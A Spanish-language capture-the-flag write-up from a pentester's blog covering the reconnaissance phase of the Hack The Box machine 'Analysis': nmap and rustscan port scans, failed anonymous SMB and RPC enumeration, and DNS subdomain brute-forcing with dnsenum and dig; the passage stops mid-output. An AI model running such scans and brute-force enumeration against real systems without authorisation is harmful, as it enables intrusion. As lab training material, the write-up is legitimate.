<!doctype html>
<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <title>Bajo el Teclado</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="" />

    
    
    
    <link rel="stylesheet" href="../../css/theme.min.css">

    
    
    

    
  


</head>
<body>
        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
    <div class="row">
        
        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
            <a href="../../" class="text-decoration-none">
                <img id="home-image" class="rounded-circle"
                    
                        
                            src="../../pointed.jpeg"
                        
                    
                />
            </a>
        </div>
        <div class="col-sm-8 col-12 text-sm-left text-center">
        
            <h2 class="m-0 mb-2 mt-4">
                <a href="../../" class="text-decoration-none">
                    
                        pointedsec
                    
                </a>
            </h2>
            <p class="text-muted mb-1">
                
                    if pentester.found == bug { make(pentester,states.happy) }
                
            </p>
            <ul id="nav-links" class="list-inline mb-2">
                
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../about/" title="About">About</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
                    </li>
                
            </ul>
            <ul id="nav-social" class="list-inline">
                
                    <li class="list-inline-item mr-3">
                        <a href="http://github.com/pointedsec" target="_blank">
                            <i class="fab fa-github fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
                            <i class="fas fa-at fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://pointedsec.vercel.app" target="_blank">
                            <i class="fas fa-globe fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
                            <i class="fas fa-box fa-1x text-muted"></i>
                        </a>
                    </li>
                
            </ul>
        </div>
    </div>
    <hr />
</header>
<div class="container">
    <div class="pl-sm-4 ml-sm-5">
        <h1 id="hack-the-box-analysis-writeup">Hack The Box: Analysis Writeup</h1>
<p>Welcome to my detailed writeup of the hard difficulty machine <strong>&ldquo;Analysis&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
<h1 id="tcp-enumeration">TCP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.230.179 --ulimit <span style="color:#ae81ff">5000</span> -g
</span></span><span style="display:flex;"><span>10.129.230.179 -&gt; <span style="color:#f92672">[</span>53,80,88,135,139,389,445,464,593,3306,5985,9389,33060,47001,49666,49664,49667,49665,49671,49678,49679,49682,49691,49704,49717,49719<span style="color:#f92672">]</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p53,80,88,135,139,389,445,464,593,3306,5985,9389,33060,47001,49666,49664,49667,49665,49671,49678,49679,49682,49691,49704,49717,49719 -sCV 10.129.230.179 -oN allPorts
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-12 19:29 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.230.179
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.042s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
</span></span><span style="display:flex;"><span>80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-08-12 15:30:00Z<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: analysis.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>3306/tcp  open  mysql         MySQL <span style="color:#f92672">(</span>unauthorized<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span style="display:flex;"><span>33060/tcp open  mysqlx?
</span></span><span style="display:flex;"><span>| fingerprint-strings: 
</span></span><span style="display:flex;"><span>|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe: 
</span></span><span style="display:flex;"><span>|     Invalid message<span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HY000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   LDAPBindReq: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     *Parse error unserializing protobuf message&#34;</span>
</span></span><span style="display:flex;"><span>|     HY000
</span></span><span style="display:flex;"><span>|   oracle-tns: 
</span></span><span style="display:flex;"><span>|     Invalid message-frame.<span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_    HY000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-title: Not Found
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">49664/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">49665/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">49666/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">49667/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">49671/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">49679/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">49682/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">49691/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">49704/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">49717/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">49719/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF-Port33060-TCP:V=7.94SVN%I=7%D=8/12%Time=66BA467F%P=x86_64-pc-linux-gnu%
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:r(GenericLines,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(GetRequest,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0</span>
</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(HTTPOptions,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:)%r(RTSPRequest,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(RPCCheck,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:0<span style="color:#ae81ff">\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(DNSStatusRequestTCP,2B,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>SF:5<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0\x</span>1e<span style="color:#ae81ff">\0\0\0\x</span>01<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>10<span style="color:#ae81ff">\x</span>88<span style="color:#e6db74">&#39;\x1a\x0fInvalid\x20message\&#34;\x05H
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:Y000&#34;)%r(Help,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(SSLSessionReq,2B,&#34;\x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:5\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;</span><span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\x</span>0fInvalid
</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20message<span style="color:#ae81ff">\&#34;\x</span>05HY000<span style="color:#e6db74">&#34;)%r(TerminalServerCookie,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>
</span></span><span style="display:flex;"><span>SF:05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(TLSSessionReq,2B,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0\x</span>1e<span style="color:#ae81ff">\0\0\0\x</span>
</span></span><span style="display:flex;"><span>SF:01<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>10<span style="color:#ae81ff">\x</span>88<span style="color:#e6db74">&#39;\x1a\x0fInvalid\x20message\&#34;\x05HY000&#34;)%r(Kerberos,9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(SMBProgNeg,9,&#34;\x05\0\0\0\x0b\x08\x05
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x1a\0&#34;)%r(X11Probe,2B,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x01\x10\x88&#39;</span><span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\x</span>0fInvalid<span style="color:#ae81ff">\x</span>20message<span style="color:#ae81ff">\&#34;\x</span>05HY000<span style="color:#e6db74">&#34;)%r(FourOhFourRequest
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(LPDString,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>SF:5<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(LDAPSearchReq,2B,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0\x</span>1e<span style="color:#ae81ff">\0\0\0\x</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>SF:1<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>10<span style="color:#ae81ff">\x</span>88<span style="color:#e6db74">&#39;\x1a\x0fInvalid\x20message\&#34;\x05HY000&#34;)%r(LDAPBindReq
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:,46,&#34;\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\x08\x01\x10\x88&#39;</span><span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\*</span>Pa
</span></span><span style="display:flex;"><span>SF:rse<span style="color:#ae81ff">\x</span>20error<span style="color:#ae81ff">\x</span>20unserializing<span style="color:#ae81ff">\x</span>20protobuf<span style="color:#ae81ff">\x</span>20message<span style="color:#ae81ff">\&#34;\x</span>05HY000<span style="color:#e6db74">&#34;)%r(SIP
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:Options,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(LANDesk-RC,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>SF:b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(TerminalServer,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:NCP,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(NotesRPC,2B,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>
</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0\x</span>1e<span style="color:#ae81ff">\0\0\0\x</span>01<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>10<span style="color:#ae81ff">\x</span>88<span style="color:#e6db74">&#39;\x1a\x0fInvalid\x20message\&#34;\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:05HY000&#34;)%r(JavaRMI,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(WMSRequest,9,&#34;\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(oracle-tns,32,&#34;\x05\0\0\0\x0b\x08\x05\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:1a\0%\0\0\0\x01\x08\x01\x10\x88&#39;</span><span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\x</span>16Invalid<span style="color:#ae81ff">\x</span>20message-frame<span style="color:#ae81ff">\.\&#34;\x</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>SF:5HY000<span style="color:#e6db74">&#34;)%r(ms-sql-s,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(giop,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:0<span style="color:#ae81ff">\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host script results:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| smb2-time: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   date: 2024-08-12T15:30:55
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_  start_date: N/A
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| smb2-security-mode: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   3:1:1: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_    Message signing enabled and required
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_clock-skew: -1h59m30s
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Nmap done: 1 IP address (1 host up) scanned in 70.94 second
</span></span></span></code></pre></div><h1 id="udp-enumeration">UDP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap --top-ports <span style="color:#ae81ff">1500</span> 10.129.230.179 -sU --min-rate <span style="color:#ae81ff">5000</span> -n -Pn -oN allPorts.UDP
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-12 19:36 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.230.179
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.042s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1497</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE  SERVICE
</span></span><span style="display:flex;"><span>88/udp    open   kerberos-sec
</span></span><span style="display:flex;"><span>123/udp   open   ntp
</span></span><span style="display:flex;"><span>18985/udp closed unknown
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 1.00 seconds
</span></span></code></pre></div><p>Añadimos el dominio <code>analysis.htb</code> al <code>/etc/hosts</code></p>
<p>Vemos los típicos puertos abiertos en un DC, LDAP, RPC, SMB&hellip; Pero a parte vemos el puerto 3306/TCP correspondiente a MySQL, para tenerlo en cuenta.</p>
<h1 id="enumerating-smb">Enumerating SMB</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ smbclient -L <span style="color:#ae81ff">\\</span>10.129.230.179 -U -N 
</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\-</span>N<span style="color:#f92672">]</span>:
</span></span><span style="display:flex;"><span>┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/analysis/scan<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ smbclient -L <span style="color:#ae81ff">\\</span>10.129.230.179 -U <span style="color:#e6db74">&#39;&#39;</span> -N 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Sharename       Type      Comment
</span></span><span style="display:flex;"><span>	---------       ----      -------
</span></span><span style="display:flex;"><span>Reconnecting with SMB1 <span style="color:#66d9ef">for</span> workgroup listing.
</span></span><span style="display:flex;"><span>do_connect: Connection to 10.129.230.179 failed <span style="color:#f92672">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Unable to connect with SMB1 -- no workgroup available
</span></span></code></pre></div><p>Por ahora no podemos hacer enumerar mediante SMB sin credenciales válidas.</p>
<h1 id="rpc-enumeration">RPC Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rpcclient -U <span style="color:#e6db74">&#34;&#34;</span> 10.129.230.179 -N
</span></span><span style="display:flex;"><span>rpcclient $&gt; enumdomusers
</span></span><span style="display:flex;"><span>result was NT_STATUS_ACCESS_DENIED
</span></span><span style="display:flex;"><span>rpcclient $&gt; enumdomgroups
</span></span><span style="display:flex;"><span>result was NT_STATUS_ACCESS_DENIED
</span></span></code></pre></div><p>Lo mismo mediante RPC.</p>
<h1 id="dns-enumeration">DNS Enumeration</h1>
<p>Siempre que me enfrento contra un servidor DNS, me gusta enumerar subdominios realizando un ataque de fuerza bruta con <code>dnsenum</code></p>
<p>Descubrimos el NS <code>dc-analysis.analysis.htb</code> y un dominio adicional <code>internal.analysis.htb</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ dnsenum -f /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --dnsserver 10.129.230.179 analysis.htb
</span></span><span style="display:flex;"><span>dnsenum VERSION:1.2.6
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-----   analysis.htb   -----
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host<span style="color:#960050;background-color:#1e0010">&#39;</span>s addresses:
</span></span><span style="display:flex;"><span>__________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>analysis.htb.                            <span style="color:#ae81ff">600</span>      IN    A        10.129.230.179
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Name Servers:
</span></span><span style="display:flex;"><span>______________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dc-analysis.analysis.htb.                <span style="color:#ae81ff">3600</span>     IN    A        10.129.230.179
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mail <span style="color:#f92672">(</span>MX<span style="color:#f92672">)</span> Servers:
</span></span><span style="display:flex;"><span>___________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Trying Zone Transfers and getting Bind Versions:
</span></span><span style="display:flex;"><span>_________________________________________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>unresolvable name: dc-analysis.analysis.htb at /usr/bin/dnsenum line 900.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Trying Zone Transfer <span style="color:#66d9ef">for</span> analysis.htb on dc-analysis.analysis.htb ... 
</span></span><span style="display:flex;"><span>AXFR record query failed: no nameservers
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Brute forcing with /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:
</span></span><span style="display:flex;"><span>__________________________________________________________________________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>www.analysis.htb.                        <span style="color:#ae81ff">3600</span>     IN    A        192.168.1.100
</span></span><span style="display:flex;"><span>internal.analysis.htb.                   <span style="color:#ae81ff">3600</span>     IN    A        192.168.1.100
</span></span><span style="display:flex;"><span>gc._msdcs.analysis.htb.                  <span style="color:#ae81ff">600</span>      IN    A        10.129.230.179
</span></span></code></pre></div><p>Alternativamente también podríamos haber descubierto el NS con <code>dig</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ dig NS analysis.htb @10.129.230.179
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>; &lt;&lt;&gt;&gt; DiG 9.18.24-1-Debian &lt;&lt;&gt;&gt; NS analysis.htb @10.129.230.179
</span></span><span style="display:flex;"><span>;; global options: +cmd
</span></span><span style="display:flex;"><span>;; Got answer:
</span></span><span style="display:flex;"><span>;; -&gt;&gt;HEADER<span style="color:#e6db74">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span style="color:#ae81ff">44364</span>
</span></span><span style="display:flex;"><span>;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>;; OPT PSEUDOSECTION:
</span></span><span style="display:flex;"><span>; EDNS: version: 0, flags:; udp: <span style="color:#ae81ff">4000</span>
</span></span><span style="display:flex;"><span>;; QUESTION SECTION:
</span></span><span style="display:flex;"><span>;analysis.htb.			IN	NS
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>;; ANSWER SECTION:
</span></span><span style="display:flex;"><span>analysis.htb.		3600	IN	NS	dc-analysis.analysis.htb.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>;; ADDITIONAL SECTION:
</span></span><span style="display:flex;"><span>dc-analysis.analysis.htb. 3600	IN	A	10.129.230.179
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>;; Query time: <span style="color:#ae81ff">36</span> msec
</span></span><span style="display:flex;"><span>;; SERVER: 10.129.230.179#53<span style="color:#f92672">(</span>10.129.230.179<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>UDP<span style="color:#f92672">)</span>
